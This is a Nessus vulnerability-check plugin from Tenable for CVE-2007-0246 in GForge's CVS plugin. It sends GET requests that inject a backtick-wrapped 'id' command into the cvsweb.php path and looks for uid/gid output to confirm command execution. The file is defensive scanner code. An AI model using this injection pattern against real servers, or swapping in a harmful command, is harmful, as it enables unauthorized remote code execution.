#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25338);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2007-0246");
  script_bugtraq_id(24141);
  script_xref(name:"OSVDB", value:"36526");

  script_name(english:"GForge CVSWeb CGI cvsweb.php PATH_INFO Variable Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via GForge's CVS Plugin");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running GForge, a web-based project for
collaborative software development. 

The version of GForge installed on the remote host fails to sanitize
user-supplied input to the 'plugins/scmcvs/cvsweb.php' script before
using it to execute a shell command.  An unauthenticated attacker can
leverage this issue to execute arbitrary code on the remote host
subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c76a0805" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest SVN version as a fix for this issue was added
with revision 6038." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/gforge", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  if (dir == "") dir = "/";

  # Get list of defined projects.
  w = http_send_recv3(method:"GET", item:dir, port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # If it looks like GForge...
  if (
    'title="Gforge - ' >< res ||
    '"Powered By GForge' >< res
  )
  {
    projects = make_list();
    pat = '<a href="/projects/([^/]+)/">';

    # nb: avoid missing projects that appear on same line as another.
    res = str_replace(find:"<br />", replace:'\n', string:res);

    matches = egrep(pattern:pat, string:res);
    if (matches)
    {
      foreach match (split(matches, keep:FALSE))
      {
        m = eregmatch(pattern:pat, string:match);
        if (!isnull(m)) projects = make_list(m[1], projects);
      }
    }

    # If we have a thread id.
    if (max_index(projects))
    {
      # Try to exploit the flaw to run a command.
      cmd = "id";
      i = 0;

      foreach project (projects)
      {
        # Only do at most 10 tests, unless thorough tests are enabled.
        if (!thorough_tests && ++i > 10) break;

        w = http_send_recv3(method:"GET",
          item:string(
            dir, "/plugins/scmcvs/cvsweb.php",
            "/`", cmd, "`/?",
            "cvsroot=", project
          ), 
          port:port
        );
	if (isnull(w)) exit(1, "the web server did not answer");
	res = w[2];

        if ("cvsweb.php/uid%3D" >< res)
        {
          # There's a problem if we see output from our command.
          line = egrep(pattern:"uid%3D[0-9]+.*gid%3D[0-9]+.*", string:res);
          if (line)
          {
            output = strstr(line, "uid%3D");
            if (output) output = output - strstr(output, "?cvsroot=");
            if (output) line = output;
          }
          if (line)
          {
            if (report_verbosity)
            {
              report = string(
                "\n",
                "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
                "It produced the following output :\n",
                "\n",
                "  ", urldecode(estr:line)
              );
              security_warning(port:port, extra:report);
            }
            else security_warning(port);
            exit(0);
          }
        }
      }
    }
    else
    {
      debug_print("couldn't find a project to use!", level:1);
    }
  }
}
